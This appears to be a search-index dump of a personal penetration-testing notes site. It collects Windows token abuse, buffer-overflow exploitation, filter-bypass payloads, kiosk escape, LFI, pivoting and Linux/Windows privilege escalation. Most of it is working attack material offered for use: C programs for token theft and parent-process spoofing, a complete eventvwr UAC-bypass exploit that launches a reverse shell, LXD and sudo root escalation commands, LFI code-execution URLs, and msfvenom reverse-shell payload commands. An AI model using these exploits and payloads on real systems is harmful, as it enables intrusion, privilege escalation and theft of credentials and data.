https://null-byte.wonderhowto.com/how-to/exploit-webdav-server-get-shell-0204718/ "},"Pentest/Techniques/Abuse tokens.html":{"url":"Pentest/Techniques/Abuse tokens.html","title":"Abuse Tokens","keywords":"","body":"Abuse Tokens Table of content Security Tokens Display token information Whoami Process Explorer Token types Primary token Impersonation token Duplicate token Interesting privileges SeImpersonatePrivilege SeAssignPrimaryPrivilege SeTcbPrivilege SeBackupPrivilege SeRestorePrivilege SeCreateTokenPrivilege SeLoadDriverPrivilege SeTakeOwnershipPrivilege SeDebugPrivilege Resources Security Tokens Each users logged on the system get an access token. Every process launched by this user contains a copy of this access token. This token is used to : Identify the user (contains the user SID) Identify the user's groups Identify the user's privileges Display token information Whoami The token information can be easily displayed using the whoami /all command. This command display ifnormation about the current user token. Process Explorer Process Explorer can be also used to display information about the token contained in a process: Token types There are two types of tokens : Primary token Impersonation token Primary token These tokens can only be associated to process. They represent the process security subject. The token creation and association to a process are privileged operations that need two different set of privileges. The standard workflow is : The authentication service create the token The logon service associates it to the user's operating system shell Process launched will unherit the token from the parent process Impersonation token These tokens allows an application to temporarily impersonate a given user. There are 4 level of impersonation: Anonymous : the server get rights of an unidentified user Identification : the server can access to the user identity but is not granted its rights Impersonation : the server can act with the same privileges than the impersonated user Delegation : same as impersonation but also applied to remote systems Impersonation token is only available on threads. Duplicate token Open the process : OpenProcess Get an handle to the token : OpenProcessToken Duplicate the token : DuplicateTokenEx Create a new process with the token : CreateProcessWithToken #include #include int main(int argc, char * argv[]) { char a; HANDLE processHandle; HANDLE tokenHandle = NULL; HANDLE duplicateTokenHandle = NULL; STARTUPINFO startupInfo; PROCESS_INFORMATION processInformation; // Change with the PID of the process to impersonate DWORD PID_TO_IMPERSONATE = 3060; // Change with the executable to launch wchar_t cmdline[] = L\"C:\\\\shell.cmd\"; ZeroMemory(&startupInfo, sizeof(STARTUPINFO)); ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION)); startupInfo.cb = sizeof(STARTUPINFO); processHandle = OpenProcess(PROCESS_ALL_ACCESS, true, PID_TO_IMPERSONATE); OpenProcessToken(processHandle, TOKEN_ALL_ACCESS, &tokenHandle); DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle); CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, NULL, cmdline, 0, NULL, NULL, &startupInfo, &processInformation); std::cin >> a; return 0; } Interesting privileges SeImpersonatePrivilege Any process with this privilege can impersonate any token as long as it can open an handle to it. Thus, it is not possible to create new token through this privilege. For example, the process can impersonnate a Windows DCOM token to perform NTLMauthentication and launch a SYSTEM process. This path is automatized through the Potatosuite. SeAssignPrimaryPrivilege It use the same method than SeImpersonatePrivilege to retrieve a privileged token. Then, this privilege can be leveraged to assign a primary token to a new or suspended process. Indeed, with the privileged token, it is possible to derivate a primary token through the DuplicateTokenEx Windows API. Then this primary token can be assigned to a new process through the CreateProcessAsUser Windows API. SeTcbPrivilege This privilege allows to use KERB_S4U_LOGON to : Get an impersonation token for any user without needing their credentials Add an arbitrary group to the token Set the toeken's integrity level to medium and assign it to the current thread through the SetThreadToekn Windows API. SeBackupPrivilege This privilege grant read access to the whole filesystem. It can be used through the robocopy \\bexecutable to copy interesting files such as SAM, SYSTEM hives or NTDS. Likewise, this privilege can be leveraged to change the permission of the selected path : # https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1 # https://github.com/giuliano108/SeBackupPrivilege function Acl-FullControl {param ($user,$path) $help = @\" .SYNOPSIS Acl-FullControl PowerShell Function: Acl-FullControl Author: Luis Vacas (CyberVaca) Required dependencies: None Optional dependencies: None .DESCRIPTION .EXAMPLE Acl-FullControl -user domain\\usuario -path c:\\users\\administrador Description ----------- If you have the SeBackupPrivilege privilege. You can change the permissions to the path you select. \"@ if ($user -eq $null -or $path -eq $null) {$help} else { \"[+] Current permissions:\" get-acl $path | fl \"[+] Changing permissions to $path\" $acl = get-acl $path $aclpermisos = $user,'FullControl','ContainerInherit,ObjectInherit','None','Allow' $permisoacl = new-object System.Security.AccessControl.FileSystemAccessRule $aclpermisos $acl.AddAccessRule($permisoacl) set-acl -Path $path -AclObject $acl \"[+] Acls changed successfully.\" get-acl -path $path | fl } } SeRestorePrivilege This privilege allows write access on the full filesystem. It can be leverage to overwritte services, DLL, or set debuggers. The exploitation follows these steps: Run a powershell with SeRestorePrivilege Enable the privilege using Enable-SeRestorePrivilege Change the utilman.exe by cmd.exe Lock the computer and press WIN+U SeCreateTokenPrivilege This privilege is intersting only if it is also possible to impersonate token (whatever the way). For exemple, a user can impersonate the token if it is for the same user and the integrity level is less or equal to the current process integrity level. Then, it is possible to create an impersonation token and add to it to privileged group SID. Likewise, it is possible to create an arbitrary token and include Administrator rights through NtCreateToken. SeLoadDriverPrivilege This privilege allows to load and unload device drivers. The exploitation path can be found here In a nutshell the exploitation follows these steps: Load a buggy kernel driver such as szkg64.sys Exploit the driver vulnerability Likewise, the privilege can be used to remove security-related driver with the ftlMC ${driverName} builtin command. SeTakeOwnershipPrivilege This privilege is similar to SeRestorePrivilege. It allows a process to take ownership of any object by granting write access to the object. The exploitation follows these steps: takeown.exe /f \"%windir%\\system32\" icalcs.exe \"%windir%\\system32\" /grant \"%username%\":F Change utilman.exe by cmd.exe Lock the console and press Win+U SeDebugPrivilege Allows a process to debug another porcess including reading and writing memory. This privilege is interesting to bypass AV/HIPS. For example, it can be used to duplicate the lsass.exe token. Resources Table of Windows processes and exploitation path : https://github.com/gtworek/Priv2Admin Exploit token for privesc : https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt "},"Pentest/Techniques/Buffer overflow.html":{"url":"Pentest/Techniques/Buffer overflow.html","title":"Buffer Overflow","keywords":"","body":"Buffer Overflow Table of content Ret2Libc Standard Ret2Libc With access to the machine Windows Pattern create Control EIP Remove badchars Manually Mona (Immunity Debugger) Find jump point Ressource Ret2Libc Frolic HTB https://infosecwriteups.com/ret2libc-attack-in-lin-3dfc827c90c3 Standard Ret2Libc 'A' * buffer_size + system_address + exit_address + /bin/sh_address The buffer size must be set in order to be able to control RIP. It can be easily found using GDB and pattern create. The infosecwriteups article show how to do it. With access to the machine Get libc address : ldd ${executable} Get libc's function offset : readelf -s ${libc} | gerp ${functionName} Get libc's string offset : string -atx ${libc} | grep ${string} The complete function address is : ${libcAddress} + ${functionOffset} Windows Pattern create # Find the binary locate pattern_create # Generate the pattern msf-pattern_create -l ${bufferSize} # Find the offset from the value leaked on EIP msf-pattern_offset -l ${initalPatternLength} -q ${patternFoundOnEIP} Control EIP The bytes set after the patternOffset will control EIP: # Set 0x42424242 in EIP buff = \"A\" * ${patternOffset} + \"BBBB\" + \"C\" * 16 Remove badchars Manually badchars = b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\" send(\"A\" * ${patternOffset} + badchars) Verify in the stack if the values are correctly sent and remove values that are not exactly the same than the one expected. For example : badchars = \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\" send(\"A\" * ${patternOffset} + 'BBBB' + badchars) # Stack state once the PE crashed : # ESP + 0 : \\x01 \\x02 \\x0A \\x08 # ESP + 8 : \\x05 \\x06 \\x07 \\x08 # # \\x03 is the first wrong value. \\x03 is a badchars. # Remove the badchar and do it again as long as all # remaining chars are correctly stored. Mona (Immunity Debugger) Generate the bytearrays inital mona byte array : !mona config -set workingfolder c:\\mona\\%p !mona bytearray -b '${badcharsList}' # !mona bytearray -b \"\\x00\" Once the program crash, use mona to detect badchars: !mona compare -f C:\\mona\\${...}\\bytearray.bin -a esp Usually, if mona detect 2 consecutive byte as badchars, it is because the first one make the second glitch. Thus, keep the first one only. For example, if mona find the following badchars : \\x00 \\x07 \\x08 \\x0A \\x0B Keep only \\x00, \\x07 and \\x0A as badchar and relaunch the process without these badchars as long as mona find other badchars. Find jump point The payload is stored in ESP. It is then required to replace the current EIP by a JMP ESP. Mona can be used to find the gadjet address: mona ! jmp -r esp -cpb \"${badchars}\" # !mona jmp -r esp -cpb \"\\x00\\x0a\\x0d\" Keep the address in litlle endian and send the following payload to get rce : send(\"A\" * ${patternOffset} + ${jmpAddress} + ${shellcode}) It can be usefull to make a NOP sleeve : send(\"A\" * ${patternOffset} + ${jmpAddress} + \"\\x90\" * 16 + ${shellcode}) Ressource https://github.com/joshua17sc/Buffer-Overflows "},"Pentest/Techniques/Command injection.html":{"url":"Pentest/Techniques/Command injection.html","title":"Command Injection","keywords":"","body":"Command injection Table of content Linux parameters cURL Linux parameters {param,value} : you can use this syntax to give parameters to a linux binary : curl {--config,file.conf}. This can be used when additional spaces cannot be inserted. cURL --config file.conf : you can use a config file to add several parameters. This can be used when you are not able to give all your parameters during the injection. "},"Pentest/Techniques/Data exfiltration.html":{"url":"Pentest/Techniques/Data exfiltration.html","title":"Data Exfiltration","keywords":"","body":"Data exfiltration Table of content Python FTP server Python FTP server FTP : https://blog.ropnop.com/transferring-files-from-kali-to-windows/#starting-the-server-1 "},"Pentest/Techniques/Exploit handles.html":{"url":"Pentest/Techniques/Exploit handles.html","title":"Exploit handles","keywords":"","body":"Exploit handles Table of content Hijack process to run arbitrary binary Hijack process to run arbitrary binary The idea is to retrieve the security token from a process launched by the targeted user. This token can then be used to launch another process on the name of the targeted user. For example, if you have administrator privileges on a machine and another user UserA run the process A.exe with PID 1234, the following script will run CMD.exe with UserAprivileges. It can be usefull to impersonnate users without needing their credentials. // Usage : SpawnChildProcess.exe // Where PID is the PID of the process to duplicate. #include #include #include #include #include #include #include #include #include #pragma comment (lib, \"crypt32.lib\") #pragma comment (lib, \"advapi32\") #pragma comment (lib, \"kernel32\") int main(int argc, char** argv) { HANDLE hProc = NULL; STARTUPINFOEX si; PROCESS_INFORMATION pi; int pid = 0; SIZE_T szAttributeList = 0; BOOL ret; ZeroMemory(&si, sizeof(STARTUPINFOEX)); Sleep(2000); if (argc != 2) { printf(\"Usage: SpawnChildProcess.exe \\n\"); return -1; } DWORD tPid = atoi(argv[1]); hProc = OpenProcess(PROCESS_ALL_ACCESS, false, tPid); if (!hProc) { printf(\"[!][OpenProcess] Error opening target process: [%d]\\n\", GetLastError()); return -1; } else { printf(\"[*][OpenProcess] Handle to target process opened.\\n\"); } // First call to InitializeProcThreadAttributeList to retrieve the AttributeList size. InitializeProcThreadAttributeList(NULL, 1, 0, &szAttributeList); if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) { printf(\"[!][InitializeProcThreadAttributeList] First call to InitializeProcThreadAttributeList failed: [%d]\\n\", GetLastError()); CloseHandle(hProc); return -1; } else { printf(\"[*][InitializeProcThreadAttributeList] Attribute list size retrieved.\\n\"); } // Alloc lpAttributeList. si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST) HeapAlloc(GetProcessHeap(), 0, szAttributeList); if (si.lpAttributeList == NULL) { printf(\"[!][HeapAlloc] Failed to heap alloc for si.lpAttributeList: [%d]\\n\", GetLastError()); CloseHandle(hProc); return -1; } // Init ProcThread AttributeList with the correctly sized szAttributeList. ret = InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &szAttributeList); if (!ret) { printf(\"[!][InitializeProcThreadAttributeList] Second call to InitializeProcThreadAttributeList failed: [%d]\\n\", GetLastError()); CloseHandle(hProc); return -1; } else { printf(\"[*][InitializeProcThreadAttributeList] Attribute list init done.\\n\"); } // Updates the specified attribute for process. ret = UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProc, sizeof(HANDLE), NULL, NULL); if (!ret) { printf(\"[!][UpdateProcThreadAttribute] Failed to update the ProcThread attribute: [%d]\\n\", GetLastError()); CloseHandle(hProc); return -1; } else { printf(\"[*][UpdateProcThreadAttribute] Attribute list for process creation updated.\\n\"); } si.StartupInfo.cb = sizeof(STARTUPINFOEX); // Spawn the new process ret = CreateProcess(_T(\"C:\\\\Windows\\\\system32\\\\cmd.exe\"), NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFO)(&si), &pi); if (!ret) { printf(\"[!][CreateProcess] Failed to create process: [%d]\\n\", GetLastError()); CloseHandle(hProc); return -1; } else { printf(\"[+][CreateProcess] Process created!\\n\"); } Sleep(2000); return 0; } "},"Pentest/Techniques/Filtering.html":{"url":"Pentest/Techniques/Filtering.html","title":"Filtering","keywords":"","body":"Filtering bypass Table of content Unicode normalization (bypass filters) Path traversal SQLi OpenRedirect XSS SSTI Command injection Ressource Unicode normalization (bypass filters) Use unicodes to bypass some filtering rules: Path traversal ‥ and ︰ : bypass .. filtering (︰/︰/︰/etc/passwd) SQLi ＇ : bypass ' filtering (＇ or ＇1＇=＇1) ＂ : bypass \" filtering (＂ or ＂1＂=＂1) ﹣ : bypass ﹣ filtering (admin＇﹣﹣) OpenRedirect 。 : bypass . filtering (domain。com) ／ : bypass // filtering (//domain.com) XSS ＜,＞ : bypass filtering (＜script src=a／＞) SSTI ﹛,﹜ : bypasss {,} filtering (﹛﹛3+3﹜﹜) ［, ］ : bypass [,] filtering (［［5+5］］) Command injection ＆ : bypass & filtering (＆＆whoami) ｜ : bypass | filtering (｜｜ whoami) Ressource https://lazarv.com/posts/unicode-normalization-vulnerabilities/ "},"Pentest/Techniques/Kioske escape.html":{"url":"Pentest/Techniques/Kioske escape.html","title":"Kioske Escape","keywords":"","body":"Kioske Escape Table of content Configuration Powershell CMD /K /C Autorun Shortcut Batch file Word macro RunPE Configuration It is possible to restrict the use of some binaries such as CMD.exe directly in the Windows configuration through the Prevent access to the command prompt policy available on User Configuration > Administrative Templates > System. Likewise, it is possible to use registry keys: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\DisableCMD HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\DisableCMD These registry keys can have three values: 0 => Policy disabled 1 => Policy enabled and script processing disabled 2 => Policy enabled and script processing enabled It is possible to bypass configuration 0 or 2. However, the bypass of 1 could be more challenging. Powershell Sometimes, the CMD is disabled but the PowerShell is not. It is then possible to directly use PowerShell : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Likewise, if PowerShell is blocked, try to use PowerShellISE : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe. In the case where AppLocker is securely configured, it is possible to bypass by copying the binary in another folder. CMD /K /C By using some CMD parameter, it is possible to bypass the restriction: /k : Run the command specified and continue /c : Run the command and stop Leveraging this parameter, it could be possible to run cmd.exe /k ${yourCommand} directly from the Windows Run (WIN+R) popup. Autorun The registry key SOFTWARE\\Microsoft\\Command Processor\\AutoRun can be configured to launch a command when the CMD is ran without any parameter. The HKLM key is run first and the HKCU is run after. By configuring your command in this registry key, it could be possible to bypass the restriction. Shortcut Create a new shortcut Set your script as a target (C:\\Windows\\System32\\cmd.exe /k \"whoami\") Open the shortcut Batch file Sometimes, the CMD is restricted but bat files can be run. Thus, it is possible to emulate an interactive shell with the following bat script: @echo off :loop set /p var=command: %var% goto loop This bypass can be also used directly in the Windows RUN popup : cmd.exe /q /v:on /k \"FOR /L %N IN () DO (set /p var=command: && !var!)\" Word macro The following VBA macro can be used to spawn a shell : Sub Parent() Set objWMIService = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2\") Set objStartup = objWMIService.Get(\"Win32_ProcessStartup\") Set objConfig = objStartup.SpawnInstance_ Set objProcess = GetObject(\"winmgmts:root\\cimv2:Win32_Process\") errReturn = objProcess.Create(\"C:\\Windows\\System32\\cmd.exe\", Null, objConfig, intProcessID) End Sub RunPE If you have access to Office (WORD, EXCEL ...), it is possible to use process hollowing techniques to spawn a shell from a VBA macro: https://github.com/itm4n/VBA-RunPE "},"Pentest/Techniques/LFI.html":{"url":"Pentest/Techniques/LFI.html","title":"LFI","keywords":"","body":"LFI Table of content Php wrappers Php wrappers Read file that are not easily displayed http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php Remote code execution http://example.com/index.php?page=expect://id "},"Pentest/Techniques/Password spraying.html":{"url":"Pentest/Techniques/Password spraying.html","title":"Password Spraying","keywords":"","body":"Password spraying Table of content SharpHose Resources SharpHose .\\SharpHose.exe --action SPRAY_USERS --spraypassword ${passwordToSpray} --domain ${domainName} --username ${domainUsername} --password ${domainPassword} Resources Github SharpHose : https://github.com/ustayready/SharpHose "},"Pentest/Techniques/Pivoting.html":{"url":"Pentest/Techniques/Pivoting.html","title":"Pivoting","keywords":"","body":"Pivoting Table of content SSH Socks5 Port redirection Nmap trough proxychains SSH Socks5 ssh -D ${port} -Nv ${user}@{ip} Port redirection socat tcp-listen:8081,reuseaddr,fork tcp:127.0.0.1:8080 Nmap trough proxychains # Use `-oN --append-output ${file}` to save in file seq 1 65535 | xargs -P 50 -I port proxychains -q nmap ${ip} -p port -T4 -Pn | grep -F 'tcp/ open' "},"Pentest/Techniques/Privileges escalation/Windows.html":{"url":"Pentest/Techniques/Privileges escalation/Windows.html","title":"Windows","keywords":"","body":"Windows Table of content Enable a disabled privilege Unquoted services path Always Install Enabled UAC-bypass (WIN10) Churrasco MS08-067 Windows XP SP1 Ressources Ressources Enable a disabled privilege Any disabled privilege can be re-enabled by the user. Import-Module ./PowerUp.ps1; EnablePrivilege -Privilege ${privilegeName} # Import-Module ./PowerUp.ps1; EnablePrivilege -Privilege SeBackupPrivilege The following C code can be used to enable a disabled privilege: #include \"stdafx.h\" #include #include ​ int main() { TOKEN_PRIVILEGES tp; LUID luid; bool bEnablePrivilege(true); HANDLE hToken(NULL); OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken); ​ if (!LookupPrivilegeValue( NULL, // lookup privilege on local system L\"SeLoadDriverPrivilege\", // privilege to lookup &luid)) // receives LUID of privilege { printf(\"LookupPrivilegeValue error: %un\", GetLastError()); return FALSE; } tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; if (bEnablePrivilege) { tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; } // Enable the privilege or disable all privileges. if (!AdjustTokenPrivileges( hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) { printf(\"AdjustTokenPrivileges error: %x\", GetLastError()); return FALSE; } ​ system(\"cmd\"); return 0; } Unquoted services path If a service is configured to launch a binary whose path contains space such as C:\\Program Files\\Directory Exemple\\binary.exe without any quotes arround, Windows will try to lauch the executables locating at the following path : C:\\Program.exe C:\\Program Files\\Directory.exe C:\\Program Files\\Directory Exemple\\binary.exe Thus, if binaries are present in either C:\\Program.exe or C:\\Program Files\\Directory.exe they will be launched instead of the real service binary. This vulnerability can be checked with the following command: # CMD only wmic service get name,displayname,pathname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\"\" The service information can be checked with: # CMD only sc qc ${serviceName} # SERVICE_NAME: DusmSvc # TYPE : 10 WIN32_OWN_PROCESS # START_TYPE : 2 AUTO_START # ERROR_CONTROL : 1 NORMAL # BINARY_PATH_NAME : C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p # LOAD_ORDER_GROUP : TDI # TAG : 0 # DISPLAY_NAME : Data Usage # DEPENDENCIES : RpcSs # SERVICE_START_NAME : NT Authority\\LocalService If START_TYPE is AUTO_START the service will be automaticaly launched during the boot. To restart a service: # CMD only sc stop ${serviceName} && sc start ${serviceName} net stop ${serviceName} && net start ${serviceName} Always Install Enabled This policy allows standard users to install applications that require access to directories and registry keys that they may not usually have permission to change. This is equivalent to grant Administrator rights to the installer process. It can be checked on the following registry key: HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer Then, create an MSI installer with VisualStudion: Create New Project > Setup Wizard Keep clicking Next until the step Choose File To Include. Then add your malicious executable. Then, click Finish. Once the project is loaded, go to View > Custom Action, right click on Install and then Add Custom Action. Double click on Applicatioin Folder and select your malicious executable and click Ok. Likewise, under Custom Action Runtime, select the appropriate plateform. It will ensure that your executable is launched when the MSI installer is run. Then install the MSI with the following command: msiexec /q /n /i Installer.msi To uninstalll the MSI once the exploit has be launched, run the following command: msiexec /q /n /uninstall Installer.msi When this technique is used to launch a beacon, the beacon will block the Windows Installer. In this case, you should inject the beacon in another process, kill the beacon running from the Windows Installer and then uninstall the MSI package used. UAC-bypass (WIN10) The following executable can be used to launch a reverse shell bypassing the UAC. // Compile on Kali with : x86_64-w64-mingw32-gcc exploit.c -o exploit.exe #include #include #include /* * Pretty standard code to recursively nuke a Reg Key */ int RegDelnodeRecurse (LPTSTR lpSubKey) { LPTSTR lpEnd; LONG lResult; DWORD dwSize = MAX_PATH; TCHAR szName[MAX_PATH]; HKEY hKey; FILETIME ftWrite; lResult = RegDeleteKey(HKEY_CURRENT_USER, lpSubKey); if (lResult == ERROR_SUCCESS) return 1; lResult = RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_READ, &hKey); if (lResult != ERROR_SUCCESS) return lResult == ERROR_FILE_NOT_FOUND; lpEnd = lpSubKey + lstrlen(lpSubKey); *lpEnd++ = '\\\\'; *lpEnd = '\\0'; if (RegEnumKeyEx(hKey, 0, szName, &dwSize, 0, 0, 0, &ftWrite) == ERROR_SUCCESS) { do { strcpy(lpEnd, szName); if (!RegDelnodeRecurse(lpSubKey)) break; lResult = RegEnumKeyEx(hKey, 0, szName, &dwSize, 0, 0, 0, &ftWrite); } while (lResult == ERROR_SUCCESS); } lpEnd--; *lpEnd = TEXT('\\0'); RegCloseKey(hKey); return RegDeleteKey(HKEY_CURRENT_USER, lpSubKey) == ERROR_SUCCESS; } /* * Wrapper for above */ int RegDelnode() { TCHAR szDelKey[MAX_PATH*2] = \"Software\\\\Classes\\\\mscfile\"; return RegDelnodeRecurse(szDelKey); } void __c_exploitUAC() { char curPath[MAX_PATH], evtVwr[MAX_PATH]; HKEY attackKey; SHELLEXECUTEINFO exInfo; /* curPath is the command you want to elevate. Below is an example that shows how to elevate foobar.exe sitting in the same path as this program. */ GetCurrentDirectory(MAX_PATH, curPath); /* Set the program to execute here. It must be placed in the same directory */ strcat(curPath, \"\\\\rev_adm.exe\"); sprintf(evtVwr, \"%s\\\\System32\\\\eventvwr.exe\", getenv(\"SYSTEMROOT\")); if(!RegDelnode()) return; if(RegCreateKey(HKEY_CURRENT_USER, \"Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command\", &attackKey)!=ERROR_SUCCESS) return; RegSetValueEx(attackKey, \"\", 0, REG_SZ, curPath, strlen(curPath)); exInfo.lpVerb = \"open\"; exInfo.lpFile = evtVwr; exInfo.nShow = 0; exInfo.fMask = SEE_MASK_NOCLOSEPROCESS; exInfo.cbSize = sizeof(SHELLEXECUTEINFO); exInfo.hwnd = 0; exInfo.lpParameters = 0; exInfo.lpDirectory = 0; exInfo.hInstApp = 0; ShellExecuteEx(&exInfo); Sleep(5000); TerminateProcess(exInfo.hProcess, 0); RegCloseKey(attackKey); RegDelnode(); } int main(int argc, char *argv[]) { __c_exploitUAC(); return 0; } https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/ https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/ Churrasco On Windows Server 2003 with and impersonation token privileges (Tokens kiddnapping revenge), use churrasco: https://github.com/Re4son/Churrasco/raw/master/churrasco.exe It will execute a given command with SYSTEM privileges. MS08-067 On Windows XP, Windows 2000 and Windows 2003 MS08-067 can allow remote code execution. https://github.com/andyacer/ms08_067 Windows XP SP1 Privilege escalation through upnphost and SSDPSRV https://sohvaxus.github.io/content/winxp-sp1-privesc.html Ressources Some Windows exploit : https://github.com/nickvourd/oscp_methodology Compiled kernel exploit : https://github.com/SecWiki/windows-kernel-exploits Ressources T.Diot github : https://github.com/Qazeer/InfoSec-Notes/blob/master/Windows/Local_privilege_escalation.md "},"Pentest/Techniques/Privileges escalation/Linux.html":{"url":"Pentest/Techniques/Privileges escalation/Linux.html","title":"Linux","keywords":"","body":"Privileges Escalation - Linux Table of content Sudo CVE-2019-14287 Backup Groups LXC/LXD SUID Last modified files Monitor new process Fix the shell Sudo CVE-2019-14287 sudo -l # (ALL, !root) /bin/bash Use CVE-2019-14287 : sudo -u#-1 /bin/bash Backup find / -name *backup* 2> /dev/null Groups LXC/LXD Build an Alpine image and start it using the flag security.privileged=true, forcing the container to interact as root with the host filesystem. # Can be done on the attack machine # build a simple alpine image git clone https://github.com/saghul/lxd-alpine-builder cd lxd-alpine-builder sed -i 's,yaml_path=\"latest-stable/releases/$apk_arch/latest-releases.yaml\",yaml_path=\"v3.8/releases/$apk_arch/latest-releases.yaml\",' build-alpine sudo ./build-alpine -a i686 # Import the created tgz on the target machine # On the target machine # Import the image # It's important doing this from YOUR HOME directory on the victim machine, or it might fail. lxc image import ./alpine*.tar.gz --alias myimage # Before running the image, start and configure the lxd storage pool as default # You can set default value everywhere lxd init # Run the image lxc init myimage mycontainer -c security.privileged=true # Mount the /root into the image lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true # Interact with the container lxc start mycontainer lxc exec mycontainer /bin/sh SUID find / -type f -user root -perm /u+s -ls 2>/dev/null find / -user root -perm -4000 -print 2>/dev/null find / -perm -u=s -type f 2>/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; Last modified files find /etc -type f -printf '%TY-%Tm-%Td %TT %p\\n' | sort -r find /home -type f -mmin -60 find / -type f -mtime -2 Monitor new process PSPY does the job but the following script can be usefull #!/bin/bash # Loop by line IFS=$'\\n' old_process=$(ps aux --forest | grep -v \"ps aux --forest\" | grep -v \"sleep 1\" | grep -v $0) while true; do new_process=$(ps aux --forest | grep -v \"ps aux --forest\" | grep -v \"sleep 1\" | grep -v $0) diff ] sleep 1 old_process=$new_process done Fix the shell # Upgrade the shell python -c 'import pty; pty.spawn(\"/bin/bash\")' # CTRL+Z # In Kali # Keep the number of rows and cols stty -a stty raw -echo fg # In reverse shell stty rows ${num} columns ${cols} reset export SHELL=bash export TERM=xterm-256color "},"Pentest/Techniques/Reverse shell.html":{"url":"Pentest/Techniques/Reverse shell.html","title":"Reverse Shell","keywords":"","body":"Reverse shell Table of content MSFVenom Windows Linux Web Onliner MSFVenom Windows msfvenom -p windows/shell/reverse_tcp LHOST=${IP} LPORT=${PORT}> -f exe > shell-x86.exe msfvenom -p windows/x64/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f exe > shell-x64.exe Linux msfvenom -p linux/x86/shell/reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf > shell-x86.elf msfvenom -p linux/x64/shell/reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf > shell-x64.elf Web ASP msfvenom -p windows/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f asp > shell.asp JSP msfvenom -p java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw > example.jsp WAR msfvenom -p java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f war > example.war PHP msfvenom -p php/meterpreter_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw > shell.php 